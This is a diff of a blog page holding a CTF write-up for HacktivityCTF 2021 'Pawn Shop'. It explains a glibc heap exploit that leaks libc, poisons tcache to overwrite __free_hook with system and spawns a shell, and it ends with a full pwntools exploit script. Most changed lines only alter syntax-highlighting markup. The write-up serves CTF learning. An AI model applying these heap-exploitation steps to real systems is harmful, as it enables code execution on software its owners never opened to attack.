+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
 </span>
-<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">))</span>
+<span class="nf">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">))</span>
 </code></pre></div></div>
 <p>Weirdly, tcachebins end up being the following:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x556d29f1f7e0, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x7b]
@@ -738,123 +738,123 @@ This means giving a simple string like <code class="language-plaintext highlight
    <span class="o">*</span><span class="n">ARG</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">double</span> <span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>                                   <span class="c1">// the culprit</span>
 </code></pre></div></div>
 <p>So, the following code will resolve the problem.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
-<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">print_items</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
-<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="nf">print_items</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Name: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
 </span>
-<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="s">'s'</span><span class="p">)</span>
+<span class="nf">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x5591a4d067e0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5591a4d06720, size=0x30, flags=PREV_INUSE)  ←  [...]
 Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7fa53fa4bb28, size=0x0, flags=) &lt;--- __free_hook
 </code></pre></div></div>
 <p>Now, we just need to make an allocation to put <code class="language-plaintext highlighter-rouge">__free_hook</code> on head and then do another allocation to overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code>. I used the first allocation to store <code class="language-plaintext highlighter-rouge">/bin/sh</code> string.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
-<span class="n">sell_item</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">sell_item</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
 </code></pre></div></div>
 <p>I put <code class="language-plaintext highlighter-rouge">/bin/sh</code> in <code class="language-plaintext highlighter-rouge">name</code> because <code class="language-plaintext highlighter-rouge">name</code> member is freed first. Now, we just need to free the chunk containing <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Just add the following line:</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
 </code></pre></div></div>
 <p>And… you get a shell!</p>
 
 <h1 id="final-exploit">Final exploit</h1>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">indexes</span> <span class="o">=</span> <span class="p">[</span><span class="bp">False</span><span class="p">]</span><span class="o">*</span><span class="mi">11</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">p</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'challenge.ctf.games'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">challenge.ctf.games</span><span class="sh">'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">LD_PRELOAD</span><span class="sh">"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>
 
 <span class="k">def</span> <span class="nf">attach_gdb</span><span class="p">():</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">NOGDB</span><span class="p">:</span>
         <span class="k">return</span>
     
-    <span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
+    <span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">'''</span><span class="s">
     // for gdb-gef
     heap chunks
     heap bins
     continue
-    '''</span><span class="p">)</span>
-    <span class="nb">input</span><span class="p">(</span><span class="s">"ATTACHED?"</span><span class="p">)</span>
+    </span><span class="sh">'''</span><span class="p">)</span>
+    <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">ATTACHED?</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">b2f</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;d'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="k">return</span> <span class="nf">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;d</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
 
 <span class="k">def</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">b2f</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+    <span class="k">return</span> <span class="nf">b2f</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">sendchoice</span><span class="p">(</span><span class="n">choice</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'B'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'buy?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">buy?: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
-<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'stdnoerr'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'M'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">M</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">?: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">sell_item</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">name_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'S'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">S</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="nf">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
         <span class="n">indexes</span><span class="p">[</span><span class="n">ret</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
         <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="mi">1</span>
     
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"No index available"</span><span class="p">)</span>
+        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">No index available</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'L'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">L</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">print_items</span><span class="p">():</span>
-    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'P'</span><span class="p">)</span>
+    <span class="nf">sendchoice</span><span class="p">(</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pawned'</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc_2.31.so'</span><span class="p">)</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./pawned</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc_2.31.so</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">start</span><span class="p">()</span>
 
-<span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
-<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">stdnoerr</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="nf">sell_item</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">print_items</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
-<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="nf">print_items</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Name: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
 </span>
-<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="s">'s'</span><span class="p">)</span>
+<span class="nf">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
-<span class="n">sell_item</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">sell_item</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">sell_item</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
 
-<span class="n">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="nf">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Lastly, if you have any questions/doubts, please ping me on discord <code class="language-plaintext highlighter-rouge">stdnoerr#7880</code>. I will be happy to discuss.</p>
@@ -868,7 +868,7 @@ Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90,
 		  
 			 
 				<li><a href="/categories.html#writeup-ref">
-					writeup <span>(2)</span>
+					writeup <span>(3)</span>
 					
 				</a></li>
 			
@@ -906,7 +906,7 @@ Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90,
 		<div>
       <section class="share col-sm-6">
         <h4 class="section-title">Share Post</h4>
-        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=HacktivityCTF 2021 pawn shop challenge writeup&via=stdnoerr"
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=HacktivityCTF 2021 - Pawn Shop&via=stdnoerr"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
           <i class="fa fa-twitter fa-lg"></i>
           Twitter
@@ -957,7 +957,7 @@ Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90,
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
